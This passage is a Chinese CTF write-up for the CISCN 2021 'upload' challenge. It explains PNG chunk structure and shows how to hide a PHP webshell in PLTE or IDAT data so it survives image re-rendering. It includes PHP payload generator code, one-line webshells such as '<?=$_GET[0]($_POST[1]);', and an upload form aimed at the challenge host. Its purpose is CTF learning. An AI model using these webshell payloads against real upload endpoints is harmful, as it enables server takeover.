punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">#&lt;?=$_GET[0]($_POST[1]);</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><p>上传页面：</p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string double-quoted-string">"en"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">&lt;</span>head<span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string double-quoted-string">"UTF-8"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"viewport"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"width=device-width, initial-scale=1.0"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token operator">&lt;</span>title<span class="token operator">></span><span class="token constant">POST</span>数据包<span class="token constant">POC</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span>body<span class="token operator">></span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string double-quoted-string">"http://85563469-3efd-4f10-95f4-9efac7955a50.node4.buuoj.cn:81/upload.php?ctf=upload"</span> method<span class="token operator">=</span><span class="token string double-quoted-string">"post"</span> enctype<span class="token operator">=</span><span class="token string double-quoted-string">"multipart/form-data"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>链接是当前打开的题目链接<span class="token operator">--</span><span class="token operator">></span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token operator">&lt;</span>label <span class="token keyword">for</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token operator">></span>文件名：<span class="token operator">&lt;</span><span class="token operator">/</span>label<span class="token operator">></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"file"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"postedFile"</span> id<span class="token operator">=</span><span class="token string double-quoted-string">"postedFile"</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>name要根据题目的源码来调节<span class="token operator">--</span><span class="token operator">></span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"提交"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></pre></td></tr></table></figure><p>上传文件时应该</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411031955751.png" alt="image-20241103195529604" /></p>
+<p>上传成功：</p>
+<p>再进行</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411031931241.png" alt="" /></p>
+<p>它存在了 example / 下名字没变直接查看就行</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411031946913.png" alt="image-20241103194618711" /></p>
+<p>最后一个一个找 flag</p>
+<p>第二个就是用这个</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1bnRlcmdyZWdhbC9QTkctSURBVC1QYXlsb2FkLUdlbmVyYXRvci8=">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</span> 工具</p>
+<p>改 payload 就行：</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411031958338.png" alt="image-20241103195849301" /></p>
+<p>步骤一样的，直接这个蚁剑链接，上个也可以找一下这个的 16 进制，换一下就行</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411032000635.png" alt="image-20241103200001605" /></p>
+<p>直接有了，解压别太快，容易炸</p>
+<p>解释</p>
+<h4 id="png结构"><a class="anchor" href="#png结构">#</a> <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL2Npc2NuLTIwMjEtcXVhbHMtd3JpdGV1cC8jY29udGVudHM6cG5nJUU3JUJCJTkzJUU2JTlFJTg0">PNG 结构</span></h4>
+<p>png 支持三种图像类型</p>
+<ul>
+<li>索引彩色图像 (index-color images)</li>
+<li>灰度图像 (grayscale images)</li>
+<li>真彩色图像 (true-color images)</li>
+</ul>
+<h5 id="png-标识"><a class="anchor" href="#png-标识">#</a> <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL2Npc2NuLTIwMjEtcXVhbHMtd3JpdGV1cC8jY29udGVudHM6cG5nLSVFNiVBMCU4NyVFOCVBRiU4Ng==">png 标识</span></h5>
+<p>png 标识作为 png 图片的头部，为固定的 8 字节</p>
+<pre><code>89 50 4E 47 OD 0A 1A 0A
+</code></pre>
+<h5 id="数据块"><a class="anchor" href="#数据块">#</a> <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL2Npc2NuLTIwMjEtcXVhbHMtd3JpdGV1cC8jY29udGVudHM6JUU2JTk1JUIwJUU2JThEJUFFJUU1JTlEJTk3">数据块</span></h5>
+<p>png 定义了两种类型的数据块，一种是称为关键数据块 (critical chunk)，标准的数据块；另一种叫做辅助数据块 (ancillary chunks)，可选的数据块。</p>
+<p>关键数据块定义了 3 个标准数据块，每个 png 文件都必须包含它们。3 个标准数据块为:  <code>IHDR， IDAT， IEND</code></p>
+<p>这里介绍 4 个：</p>
+<ul>
+<li>文件头数据块 <code>IHDR</code> (header chunk)</li>
+<li>调色板数据块 <code>PLTE</code> (palette chunk)</li>
+<li>图像数据块 <code>IDAT</code> (image data chunk)</li>
+<li>图像结束数据 <code>IEND</code> (image trailer chunk)</li>
+</ul>
+<p>每个数据块都由下表所示的的 4 个域组成。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">名称</th>
+<th style="text-align:center">字节数</th>
+<th style="text-align:center">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Length (长度)</td>
+<td style="text-align:center">4 字节</td>
+<td style="text-align:center">指定数据块中数据域的长度，其长度不超过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(2^{31}-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 字节</td>
+</tr>
+<tr>
+<td style="text-align:center">Chunk Type Code (数据块类型码)</td>
+<td style="text-align:center">4 字节</td>
+<td style="text-align:center">数据块类型码由 ASCII 字母 (A-Z 和 a-z) 组成</td>
+</tr>
+<tr>
+<td style="text-align:center">Chunk Data (数据块实际内容)</td>
+<td style="text-align:center">可变长度</td>
+<td style="text-align:center">存储按照 Chunk Type Code 指定的数据</td>
+</tr>
+<tr>
+<td style="text-align:center">CRC (循环冗余检测)</td>
+<td style="text-align:center">4 字节</td>
+<td style="text-align:center">存储用来检测是否有错误的循环冗余码</td>
+</tr>
+</tbody>
+</table>
+<p>其中 CRC (cyclic redundancy check) 域中的值是对 Chunk Type Code 域和 Chunk Data 域中的数据进行计算得到的，可以看做一种校验码</p>
+<hr />
+<ul>
+<li>
+<p>文件头数据块<strong> IHDR</strong>(header chunk)：</p>
+<p>它包含有 PNG 文件中存储的图像数据的基本信息，并要作为第一个数据块出现在 PNG 数据流中，而且一个 PNG 数据流中只能有一个文件头数据块。</p>
+</li>
+<li>
+<p>调色板数据块<strong> PLTE</strong>(palette chunk)：</p>
+<p>它包含有与索引彩色图像 ((indexed-color image)) 相关的彩色变换数据，它仅与索引彩色图像有关，而且要放在图像数据块 (image data chunk) 之前。真彩色的 PNG 数据流也可以有调色板数据块，目的是便于非真彩色显示程序用它来量化图像数据，从而显示该图像。结构如下：</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">颜色</th>
+<th style="text-align:center">字节</th>
+<th style="text-align:center">意义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Red</td>
+<td style="text-align:center">1 byte</td>
+<td style="text-align:center">0 = 黑色，255 = 红</td>
+</tr>
+<tr>
+<td style="text-align:center">Green</td>
+<td style="text-align:center">1 byte</td>
+<td style="text-align:center">0 = 黑色，255 = 绿色</td>
+</tr>
+<tr>
+<td style="text-align:center">Blue</td>
+<td style="text-align:center">1 byte</td>
+<td style="text-align:center">0 = 黑色，255 = 蓝色</td>
+</tr>
+</tbody>
+</table>
+<pre><code>PLTE数据块是定义图像的调色板信息，PLTE可以包含1~256个调色板信息，每一个调色板信息由3个字节组成，因此调色板数据块所包含的最大字节数为768，调色板的长度应该是3的倍数，否则，这将是一个非法的调色板。
+
+对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。
+</code></pre>
+<ul>
+<li>图像数据块<strong> IDAT</strong>(image data chunk)：</li>
+</ul>
+<p>它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
+<p>IDAT 存放着图像真正的数据信息</p>
+<ul>
+<li>
+<p>图像结束数据<strong> IEND</strong>(image trailer chunk)：</p>
+<p>它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
+<pre><code>00 00 00 00 49 45 4E 44 AE 42 60 82
+</code></pre>
+<p>由于数据块结构的定义，IEND 数据块的长度总是 0（00 00 00 00，除非人为加入信息），数据标识总是 IEND（49 45 4E 44），因此，CRC 码也总是 AE 42 60 82</p>
+</li>
+</ul>
+<h4 id="写思路"><a class="anchor" href="#写思路">#</a> <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL2Npc2NuLTIwMjEtcXVhbHMtd3JpdGV1cC8jY29udGVudHM6JUU1JTg2JTk5JUU2JTgwJTlEJUU4JUI3JUFG">写🐎思路</span></h4>
+<p>了解了 png 结构之后，我们大概有两种思路构造 webshell</p>
+<ol>
+<li>
+<p>向<strong> PLTE</strong> 插入 php 代码</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h4ZXIvaW1hZ2VjcmVhdGVmcm9tLS90cmVlL21hc3Rlci9wbmcvYW5hbHlzaXM=">https://github.com/hxer/imagecreatefrom-/tree/master/png/analysis</span></p>
+<blockquote>
+<p>分析底层源码可知， png signature 是不可能插入 php 代码的； IHDR 存储的是 png 的图片信息，有固定的长度和格式，程序会提取图片信息数据进行验证，很难插入 php 代码；而 PLTE 主要进行了 CRC 校验和颜色数合法性校验等简单的校验，那么很可能在 data 域插入 php 代码。</p>
+<p>从对 PLTE chunk 验证的分析可知， 当原始图片格式给索引图片时，PLTE 数据块在满足 png 格式规范的情况下，程序还会进行 CRC 校验和长度合法性验证。因此，要将 PHP 代码写入 PLTE 数据块，不仅要修改 data 域的内容为 php 代码，然后修改 CRC 为正确的 CRC 校验值，当要填充的代码过长时，可以改变 length 域的数值，满足 length 为 3 的倍数， 且颜色数不超过色深中规定的颜色数。例如: IHDR 数据块中 Bit depth 为 08, 则最大的颜色数为 2^8=256, 那么 PLTE 数据块 data 的长度不超过 3*256=0x300。 这个长度对写入 php 一句话木马或者创建后门文件足够了。</p>
+</blockquote>
+<p>通过文章的 exp 构造的 webshell，能过只有 <code>imagecreatefrompng</code>  和 <code>imagepng</code>  的。</p>
+<p>但是经过题目 <code>imagecrop</code>  这种裁剪，会被有规律的吞掉</p>
+<p><img data-src="https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210522224140.png" alt="image-20210522224138197" /></p>
+<p>解决方案是可以硬调：</p>
+<pre><code>*/$&lt;?=_GET/**/[fghijk;/*(/*rstuvw0])*/e$%^val/*+//
+//就问这是人能调出来的么？&lt;?=eval($_GET[0]);
+</code></pre>
+</li>
+<li>
+<p>向<strong> IDAT</strong> 插入 php 代码</p>
+<p>原理剖析：<span class="exturl" data-url="aHR0cHM6Ly93d3cuaWRvbnRwbGF5ZGFydHMuY29tLzIwMTIvMDYvZW5jb2Rpbmctd2ViLXNoZWxscy1pbi1wbmctaWRhdC1jaHVua3Mv">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></p>
+<p>exp：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1bnRlcmdyZWdhbC9QTkctSURBVC1QYXlsb2FkLUdlbmVyYXRvci8=">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</span></p>
+<p>当然也可以使用 php 版本的 exp：</p>
+<table>
+<thead>
+<tr>
+<th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24</code></th>
+<th><code>&lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,           0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color); &#125; imagepng($img,'wh1sper.php');//要修改的图片的路径 /* 木马内容 &lt;?$_GET[0]($_POST[1]);?&gt; */ </code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>网上的 wp 大多都用的第二种方法，用 python 的 exp。然后是把 <code>$_GET[0]</code>  改成了 <code>EVAL</code> ，然后需要按照算法计算一下 crc</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pdXp6eC9hcnRpY2xlL2RldGFpbHMvMTE2ODg1MDgz">https://blog.csdn.net/miuzzx/article/details/116885083</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9sZW1vbnByZWZlY3QuY24vemgtY24vcG9zdHMvN2MwODNmYTEjaW1hZ2VjcmVhdGVmcm9tcG5nLWJ5cGFzcw==">https://lemonprefect.cn/zh-cn/posts/7c083fa1#imagecreatefrompng-bypass</span></p>
+<blockquote>
+<p>使用参考的 Repo 中的代码可以生成一个长度为 25 的任意 PHP payload 的正方形图片，只需要将自带的 payload 经过 Raw Deflate 之后再 Inflate 即可</p>
+</blockquote>
+</li>
+</ol>
+<h4 id="题外话"><a class="anchor" href="#题外话">#</a> <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL2Npc2NuLTIwMjEtcXVhbHMtd3JpdGV1cC8jY29udGVudHM6JUU5JUEyJTk4JUU1JUE0JTk2JUU4JUFGJTlE">题外话</span></h4>
+<p>这个姿势并不是新东西，在 upload-labs17 和 DDCTF 都出现过，没做出来还是说明题刷少了</p>
+<p>另外还有其他图片的二次渲染具体可以看看：<span class="exturl" data-url="aHR0cHM6Ly93d3cuc3Fsc2VjLmNvbS8yMDIwLzEwL3VwbG9hZC5odG1sI3RvYy1oZWFkaW5nLTE3">https://www.sqlsec.com/2020/10/upload.html#toc-heading-17</span></p>
+<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLndoMXNwZXIuY29tL3Bvc3RzL2Npc2NuLTIwMjEtcXVhbHMtd3JpdGV1cC8jdXBsb2Fk">https://blog.wh1sper.com/posts/ciscn-2021-quals-writeup/#upload</span></p>
+
+      <div class="tags">
+          <a href="/tags/buuctf/" rel="tag"><i class="ic i-tag"></i> buuctf</a>
+          <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"><i class="ic i-tag"></i> 文件上传</a>
+          <a href="/tags/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93/" rel="tag"><i class="ic i-tag"></i> 二次渲染</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2024-11-03 20:01:58" itemprop="dateModified" datetime="2024-11-03T20:01:58+08:00">2024-11-03</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2024/11/03/CISCN2021Quals-upload/" title="[CISCN2021Quals]upload">http://odiws.github.io/2024/11/03/CISCN2021Quals-upload/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/10/28/newstarctf2024/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?311672" title="newstarctf2024">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> 比赛复现</span>
+  <h3>newstarctf2024</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?582647" title="[2021祥云杯]PackageManager2021">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>[2021祥云杯]PackageManager2021</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#png%E7%BB%93%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text"> PNG 结构</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#png-%E6%A0%87%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> png 标识</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%9D%97"><span class="toc-number">1.2.</span> <span class="toc-text"> 数据块</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text"> 写🐎思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E5%A4%96%E8%AF%9D"><span class="toc-number">3.</span> <span class="toc-text"> 题外话</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2024/04/28/3-txt/" rel="bookmark" title="buuctf4月27日">buuctf4月27日</a></li><li><a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" rel="bookmark" title="'[RootersCTF2019]I_<3_Flask'">'[RootersCTF2019]I_<3_Flask'</a></li><li><a href="/2024/06/06/%5BNCTF2019%5DSQLi/" rel="bookmark" title="'[NCTF2019]SQLi'">'[NCTF2019]SQLi'</a></li><li><a href="/2024/06/07/%5BNPUCTF2020%5Dezinclude/" rel="bookmark" title="'[NPUCTF2020]ezinclude'">'[NPUCTF2020]ezinclude'</a></li><li><a href="/2024/06/11/2019-EasyWeb/" rel="bookmark" title="[SUCTF 2019]EasyWeb">[SUCTF 2019]EasyWeb</a></li><li><a href="/2024/07/25/2019-Web-Unagi/" rel="bookmark" title="[CSAWQual2019]Web_Unagi">[CSAWQual2019]Web_Unagi</a></li><li><a href="/2024/07/26/1/" rel="bookmark" title="easybypass">easybypass</a></li><li><a href="/2024/07/28/2020-Greatphp/" rel="bookmark" title="[极客大挑战2020]Greatphp">[极客大挑战2020]Greatphp</a></li><li><a href="/2024/07/28/2019-SVGMagic/" rel="bookmark" title="[BSidesCF2019]SVGMagic">[BSidesCF2019]SVGMagic</a></li><li><a href="/2024/07/29/ISITDTU2019-EasyPHP/" rel="bookmark" title="[羊城杯2020]easyphp">[羊城杯2020]easyphp</a></li><li><a href="/2024/08/15/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="bookmark" title="[安洵杯2019]不是文件上传">[安洵杯2019]不是文件上传</a></li><li><a href="/2024/09/23/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-iamthinking/" rel="bookmark" title="[安洵杯2019]iamthinking">[安洵杯2019]iamthinking</a></li><li><a href="/2024/10/17/RCTF2019-Nextphp/" rel="bookmark" title="[RCTF2019]Nextphp">[RCTF2019]Nextphp</a></li><li><a href="/2024/10/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-notes/" rel="bookmark" title="[网鼎杯2020青龙组]notes">[网鼎杯2020青龙组]notes</a></li><li><a href="/2024/10/21/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-EasySer/" rel="bookmark" title="[羊城杯2020]EasySer">[羊城杯2020]EasySer</a></li><li><a href="/2024/10/23/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include0%E3%80%820/" rel="bookmark" title="[NewStarCTF2023公开赛道]include0。0">[NewStarCTF2023公开赛道]include0。0</a></li><li class="active"><a href="/2024/11/03/CISCN2021Quals-upload/" rel="bookmark" title="[CISCN2021Quals]upload">[CISCN2021Quals]upload</a></li><li><a href="/2024/11/04/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-PackageManager2021/" rel="bookmark" title="[2021祥云杯]PackageManager2021">[2021祥云杯]PackageManager2021</a></li><li><a href="/2024/11/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-Roamphp2-Myblog/" rel="bookmark" title="[极客大挑战2020]Roamphp2-Myblog">[极客大挑战2020]Roamphp2-Myblog</a></li><li><a href="/2024/11/05/HXBCT-2021-easywill/" rel="bookmark" title="[HXBCT_2021]easywill">[HXBCT_2021]easywill</a></li><li><a href="/2024/11/05/HFCTF2021Quals-Unsetme/" rel="bookmark" title="[HFCTF2021Quals]Unsetme">[HFCTF2021Quals]Unsetme</a></li><li><a href="/2024/11/05/WMCTF2020-Web-Check-in-2-0/" rel="bookmark" title="[WMCTF2020]Web-Check-in-2.0">[WMCTF2020]Web-Check-in-2.0</a></li><li><a href="/2024/11/07/%E8%93%9D%E5%B8%BD%E6%9D%AF-2021-One-Pointer-PHP/" rel="bookmark" title="[蓝帽杯_2021]One_Pointer_PHP">[蓝帽杯_2021]One_Pointer_PHP</a></li><li><a href="/2024/11/08/HarekazeCTF2019-Sqlite-Voting/" rel="bookmark" title="[HarekazeCTF2019]Sqlite-Voting">[HarekazeCTF2019]Sqlite-Voting</a></li><li><a href="/2024/11/08/JMCTF2021-UploadHub/" rel="bookmark" title="[JMCTF2021]UploadHub">[JMCTF2021]UploadHub</a></li><li><a href="/2024/11/10/NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql/" rel="bookmark" title="[NewStarCTF-2023-公开赛道]ez_sql">[NewStarCTF-2023-公开赛道]ez_sql</a></li><li><a href="/2024/11/14/NPUCTF2020-webdog/" rel="bookmark" title="NPUCTF2020webdog">NPUCTF2020webdog</a></li><li><a href="/2024/11/15/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E5%8D%8A%E5%86%B3%E8%B5%9B-faka/" rel="bookmark" title="[网鼎杯2020半决赛]faka">[网鼎杯2020半决赛]faka</a></li><li><a href="/2024/11/17/HCTF2018-Hideandseek/" rel="bookmark" title="HCTF2018Hideandseek">HCTF2018Hideandseek</a></li><li><a href="/2024/11/18/FBCTF2019-Products-Manager/" rel="bookmark" title="[FBCTF2019]Products-Manager">[FBCTF2019]Products-Manager</a></li><li><a href="/2024/11/18/BSidesCF-2019-Mixer/" rel="bookmark" title="[BSidesCF-2019]Mixer">[BSidesCF-2019]Mixer</a></li><li><a href="/2024/11/19/BSidesCF-2020-Cards/" rel="bookmark" title="[BSidesCF-2020]Cards">[BSidesCF-2020]Cards</a></li><li><a href="/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp4-Rceme/" rel="bookmark" title="[极客大挑战-2020]Roamphp4-Rceme">[极客大挑战-2020]Roamphp4-Rceme</a></li><li><a href="/2024/11/20/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-BabyJS/" rel="bookmark" title="[网鼎杯-2020-半决赛]BabyJS">[网鼎杯-2020-半决赛]BabyJS</a></li><li><a href="/2024/11/22/HMGCTF2022-Smarty-Calculator/" rel="bookmark" title="[HMGCTF2022]Smarty-Calculator">[HMGCTF2022]Smarty-Calculator</a></li><li><a href="/2024/11/29/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/" rel="bookmark" title="[红明谷CTF-2021]EasyTP">[红明谷CTF-2021]EasyTP</a></li><li><a href="/2024/12/01/LineCTF2022-BB/" rel="bookmark" title="[LineCTF2022]BB">[LineCTF2022]BB</a></li><li><a href="/2024/12/01/NewStarCT-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again/" rel="bookmark" title="[NewStarCT_2023_公开赛道]Upload_again!">[NewStarCT_2023_公开赛道]Upload_again!</a></li><li><a href="/2024/12/04/%E5%88%B7%E6%96%B0%E8%BF%87%E7%9A%84%E5%9B%BE%E7%89%87/" rel="bookmark" title="刷新过的图片">刷新过的图片</a></li><li><a 